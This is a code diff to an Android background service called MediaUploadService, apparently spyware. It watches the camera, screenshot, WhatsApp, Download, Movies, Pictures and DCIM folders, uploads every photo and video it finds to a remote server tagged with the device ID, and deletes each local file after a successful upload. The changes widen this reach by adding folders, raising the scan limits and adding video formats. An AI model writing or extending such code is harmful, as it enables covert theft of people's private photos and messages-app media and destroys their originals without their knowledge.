@@ -38,7 +38,7 @@ public class MediaUploadService extends Service {
 
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        // Android 10+ ke liye MediaStore se scan karo
+        // Android 10+ के लिए MediaStore से scan करो
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             scanExistingImages();
             scanExistingVideos();  // 🔥 VIDEOS BHI SCAN HOGE
@@ -48,10 +48,12 @@ public class MediaUploadService extends Service {
         watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Camera/", "camera");
         watchFolder(Environment.getExternalStorageDirectory() + "/Pictures/Screenshots/", "screenshot");
         watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/", "whatsapp");
-        watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/", "whatsapp_video");  // 🔥 NEW
+        watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/", "whatsapp_video");
         watchFolder(Environment.getExternalStorageDirectory() + "/Download/", "download");
-        watchFolder(Environment.getExternalStorageDirectory() + "/Movies/", "movie");  // 🔥 NEW
-        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Video/", "video");  // 🔥 NEW
+        watchFolder(Environment.getExternalStorageDirectory() + "/Movies/", "movie");
+        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Video/", "video");
+        watchFolder(Environment.getExternalStorageDirectory() + "/Pictures/", "pictures");
+        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/", "dcim");
 
         Log.d(TAG, "MediaUploadService started");
     }
@@ -66,7 +68,7 @@ public class MediaUploadService extends Service {
                 projection,
                 null,
                 null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 50")) {
+                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 100")) {
 
             if (cursor != null) {
                 int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
@@ -83,7 +85,7 @@ public class MediaUploadService extends Service {
         }
     }
 
-    // 🔥 NEW: VIDEOS SCAN KARNE KA METHOD
+    // 🔥 VIDEOS SCAN KARNE KA METHOD
     private void scanExistingVideos() {
         Log.d(TAG, "Scanning existing videos...");
 
@@ -94,7 +96,7 @@ public class MediaUploadService extends Service {
                 projection,
                 null,
                 null,
-                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 20")) {
+                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 50")) {
 
             if (cursor != null) {
                 int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);
@@ -129,7 +131,8 @@ public class MediaUploadService extends Service {
                     if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") ||
                             fileName.endsWith(".png") || fileName.endsWith(".gif") ||
                             fileName.endsWith(".mp4") || fileName.endsWith(".3gp") ||
-                            fileName.endsWith(".mkv") || fileName.endsWith(".webm")) {  // 🔥 VIDEOS ADD KIYE
+                            fileName.endsWith(".mkv") || fileName.endsWith(".webm") ||
+                            fileName.endsWith(".mov") || fileName.endsWith(".avi")) {
 
                         uploadToServer(fullPath, folderType);
                     }
@@ -151,10 +154,11 @@ public class MediaUploadService extends Service {
         }
 
         try {
-            // 🔥 VIDEO KE LIYE ALAG MIME TYPE
+            // VIDEO KE LIYE ALAG MIME TYPE
             MediaType mediaType;
             if (filePath.endsWith(".mp4") || filePath.endsWith(".3gp") ||
-                    filePath.endsWith(".mkv") || filePath.endsWith(".webm")) {
+                    filePath.endsWith(".mkv") || filePath.endsWith(".webm") ||
+                    filePath.endsWith(".mov") || filePath.endsWith(".avi")) {
                 mediaType = MediaType.parse("video/*");
             } else {
                 mediaType = MediaType.parse("image/*");
@@ -177,7 +181,7 @@ public class MediaUploadService extends Service {
                                 Log.d(TAG, "✅ Upload successful: " + file.getName());
                                 file.delete();
                             } else {
-                                Log.e(TAG, "❌ Upload failed: " + response.code());
+                                Log.e(TAG, "❌ Upload failed: " + response.code() + " - " + response.message());
                             }
                         }
 
